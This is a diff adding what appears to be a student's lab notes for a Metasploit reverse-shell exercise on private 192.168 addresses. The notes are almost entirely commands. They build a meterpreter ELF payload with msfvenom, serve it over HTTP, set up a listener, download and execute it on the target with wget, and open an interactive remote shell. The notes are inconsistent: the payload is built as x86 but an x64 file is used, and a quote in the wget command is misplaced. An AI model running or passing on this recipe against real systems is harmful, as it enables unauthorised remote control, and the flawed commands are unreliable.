@@ -1,0 +1,41 @@
+Attacker side :- 
+  ping -c 3 192.168.147.102  - to check
+
+  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.147.101 LPORT=4444 -f elf -o shell_x86.elf  - create meterpreter
+ 
+  file shell_x64.elf
+  ls -l shell_*.elf
+
+  python3 -m http.server 8000 &
+  msfconsole  - go to metasploit console
+  use exploit/multi/handler -  to use a payload
+  set PAYLOAD linux/x64/meterpreter/reverse_tcp   -  to choose the exploit for reverse shell 
+  set LHOST 192.168.147.101   - setting up the local host ip address 
+  set LPORT 4444         - to choose the port 
+  set ExitOnSession false
+  exploit -j
+
+
+Target side :-
+
+  
+  wget "http://192.168.147.101:8000/shell_x64.elf -O /tmp/shell_x64.elf " - to download the exploit
+  file /tmp/shell_x64.elf
+  chmod +x /tmp/shell_x64.elf
+  /tmp/shell_x64.elf  - to run the exploit temporarily
+
+Attacker side :-
+  sessions -l  - to start the reverse shell 
+  sessions -i 1
+  # meterpreter prompt now:
+  meterpreter > sysinfo
+  meterpreter > getuid
+  meterpreter > shell
+
+
+  pkill -f "python3 -m http.server"   -  to end the server
+  rm shell_x64.elf - to remove the payload
+
+
+all the screen shot has been added to the README.md
+  
